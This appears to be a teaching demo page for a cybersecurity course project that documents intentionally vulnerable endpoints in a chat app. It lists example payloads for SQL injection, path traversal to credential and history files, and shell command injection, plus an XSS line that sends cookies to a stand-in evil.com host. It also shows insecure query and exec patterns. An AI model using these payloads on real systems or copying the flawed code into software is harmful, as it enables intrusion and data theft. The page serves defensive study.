Controlled Security Demo Environment — This page demonstrates intentional vulnerabilities in NexaChat for the ShieldWatch CS-471 cybersecurity project. The /api/raw/* endpoints bypass ShieldWatch to show what attacks look like unprotected. Compare the live results with vs. without RASP protection. Do NOT deploy these endpoints in production.
1
SQL Injection — Login Bypass & Data Dump
CWE-89 · /api/login · /api/raw/login
CRITICAL

The login query uses raw string concatenation: SELECT * FROM users WHERE username = '${username}' AND password = '${password}'. An attacker can inject SQL to skip the password check entirely, or use UNION to dump all user data.

Example payloads:

admin'-- → drops password check
' OR '1'='1 → always true
' UNION SELECT id,username,password,role,avatar_color,bio,created_at FROM users LIMIT 1-- → dumps DB

Path Traversal — Read Arbitrary Server Files
CWE-22 · /api/file · /api/raw/file
CRITICAL

The file endpoint does path.join(__dirname, 'uploads', filename) with no jail check. An attacker uses ../ to escape the uploads directory and read any file on the server.

../private/db_config.txt ../../etc/passwd ../../home/ubuntu/.bash_history ../../home/ubuntu/nexachat/server.js

IDOR — Access Any User's Record + Plaintext Password
CWE-639 · /api/user/:id · /api/raw/user/:id
CRITICAL

GET /api/user/:id has no ownership check. Any authenticated user can fetch any other user's full database record — including their plaintext password — by iterating IDs.

Command Injection — Remote Code Execution
CWE-78 · /api/tools/ping · /api/raw/ping
CRITICAL

The ping tool passes the host parameter directly to exec("ping -c 1 " + host). An attacker appends shell commands to run arbitrary code on the server.

8.8.8.8 && id 8.8.8.8; whoami 8.8.8.8 && cat /etc/hostname 8.8.8.8 && ls /home

Reflected XSS — Script Injection via Search
CWE-79 · /api/search · /api/raw/search
HIGH

The search API returns the raw query string in data.query. The chat.js frontend renders it with innerHTML. Without ShieldWatch, any HTML/JS in the search query executes in the victim's browser. The data.query field below shows what would be injected.

<script>alert(document.cookie)</script> <img src=x onerror=alert(1)> <svg onload=fetch('https://evil.com?c='+document.cookie)>

CSRF — Unauthorized Profile Modification
CWE-352 · /api/profile/update
HIGH

The profile update endpoint accepts form-encoded POSTs with no CSRF token. A malicious page can silently change the victim's profile while they're logged in. No interaction needed — just visiting the evil URL triggers it.
